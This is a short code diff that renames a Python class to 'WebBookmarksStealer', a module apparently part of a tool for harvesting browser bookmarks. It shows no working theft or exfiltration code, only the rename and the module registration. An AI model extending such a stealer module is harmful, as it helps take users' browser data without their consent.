@@ -6,7 +6,7 @@ from config.constants import Constant
 from config.manager import ModuleManager
 
 
-class WebBookmars(ModuleManager):
+class WebBookmarksStealer(ModuleManager):
     def __init__(self) -> None:
         super().__init__(module_name="WebBookmarkStealer")
         
